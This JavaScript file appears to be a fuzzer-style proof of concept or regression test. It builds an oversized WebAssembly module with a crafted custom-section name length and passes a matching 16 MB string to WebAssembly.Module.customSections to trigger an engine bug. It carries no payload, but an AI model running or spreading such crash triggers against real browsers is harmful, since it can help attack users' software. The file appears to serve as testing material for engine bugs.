function f0() {
}
let module_size = 19;
let string_len = 16777200 - module_size;
f0("Allocating backing store: " + (string_len + module_size));
const v12 = new ArrayBuffer(string_len + module_size);
let backing = v12;
f0("Allocating typed array buffer");
const v17 = new Uint8Array(backing);
let buffer = v17;
f0("Filling...");
buffer.fill(65);
f0("Setting up array buffer");
buffer.set([0,97,115,109], 0);
buffer.set([1,0,0,0], 4);
buffer.set([0], 8);
buffer.set([128,128,128,128,0], 9);
let x = string_len + 1;
let b1 = ((x >> 0) & 127) | 128;
let b2 = ((x >> 7) & 127) | 128;
let b3 = ((x >> 14) & 127) | 128;
let b4 = (x >> 21) & 127;
buffer.set([b1,b2,b3,b4], 14);
f0("Parsing module...");
const v86 = WebAssembly.Module;
let v87;
try { v87 = new v86(buffer); } catch (e) {}
let m = v87;
f0("Triggering!");
const v94 = ("A").repeat(string_len + 1);
const v95 = WebAssembly.Module;
let v96;
try { v96 = v95.customSections(m, v94); } catch (e) {}
let c = v96;
c?.length;
